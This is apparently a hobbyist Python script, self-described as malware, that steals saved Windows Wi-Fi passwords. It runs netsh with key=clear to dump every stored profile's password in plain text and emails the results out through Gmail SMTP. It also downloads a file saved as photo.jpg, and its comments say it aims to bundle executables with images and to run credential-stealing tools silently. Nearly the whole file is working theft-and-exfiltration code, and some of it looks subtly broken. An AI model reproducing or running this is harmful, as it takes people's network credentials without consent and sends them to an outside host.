'''
    author : zerobits01
    created: 28-Jan-2020
    purpose: malware is a program that does a special
        task. (System commands(all OSs) are the most usable options)
    this script is for discovering network password
    download => show image => execute and report
'''

import subprocess
import smtplib
import re
import requests
import os, sys

command0 = 'netsh wlan show profile' # shows all known profiles
command1 = 'netsh wlan show profile %s' #
command2 = 'netsh wlan show profile %s key=clear' # shows the password ascii

def download(url):
    resp = requests.get(url).content
    realpath = os.path.abspath(os.path.dirname(sys.argv[0]))
    with open(file=realpath+'/photo.jpg',mode='wb') as image:
        image.writelines(resp)
    # we can download image and executable together and running both of them
    # we have an app named lazange that helps us to get passwords and ...
    # we should learn how to implement them by ourselves and silently

def sendMail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(user=email,password=password)
    server.sendmail(email,email,message)
    server.quit()

def discoverProfiles():
    all_profiles = re.findall(r'(?:Profile\s*:\s*)(?P<profile>\S+)',
                             subprocess.check_output(command0))
    all_passwords=""
    for prof in all_profiles:
        all_passwords += subprocess.check_output(command2%(prof))+'\n\n\n'
    sendMail('gmail','password', all_passwords)


'''
learning about windows and unix base system commands is
the most important part of hacking.
'''